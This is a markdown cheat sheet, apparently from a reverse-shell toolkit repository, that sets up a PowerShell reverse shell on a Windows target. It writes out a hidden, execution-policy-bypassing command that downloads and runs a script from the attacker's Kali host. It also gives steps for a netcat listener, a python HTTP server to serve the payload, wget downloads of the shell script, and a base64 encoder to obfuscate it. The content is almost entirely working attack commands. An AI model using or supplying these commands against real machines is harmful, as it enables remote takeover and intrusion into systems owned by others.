# **PowerShell Reverse Shell Command**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')"
```

### **Steps:**

1. **Set Up the Listener on Kali**  
    Run Netcat to listen for incoming connections:
    
    ```bash
    nc -lvnp <port>
    ```

   Replace `<port>` with the desired listening port.
2. **Prepare the Reverse Shell Script** Save the [PowerShell](https://github.com/MGamalCYSEC/ReverseShellCrafter/raw/refs/heads/main/PowerShell/reverse.rar) then Replace `<kali_ip>` with your Kali machine's IP address and `<port>` with the same port you used for the listener.
``` shell
wget https://github.com/MGamalCYSEC/ReverseShellCrafter/raw/refs/heads/main/PowerShell/reverse.rar
```

3. **Start a Simple HTTP Server on Kali**
   
    ```bash
    python3 -m http.server 80
    ```
    
    This will serve the `reverse.ps1` file over HTTP.
    
4. **Run the PowerShell Command on the Target Machine** Replace `<kali_ip>` in the command with your Kali machine's IP address:
    
    ```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')"
    ```
    
   ---
# **Steps to Encode the Reverse Shell**
The [Python code](https://raw.githubusercontent.com/MGamalCYSEC/ReverseShellCrafter/refs/heads/main/PowerShell/encode.py) encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
Download it 
``` shell
wget https://raw.githubusercontent.com/MGamalCYSEC/ReverseShellCrafter/refs/heads/main/PowerShell/encode.py
```

Replace `<kali_ip>` with your Kali machine's IP address and `<port>` with the same port you used for the listener.
We can run it and retrieve the output to use it as an encoded RCE

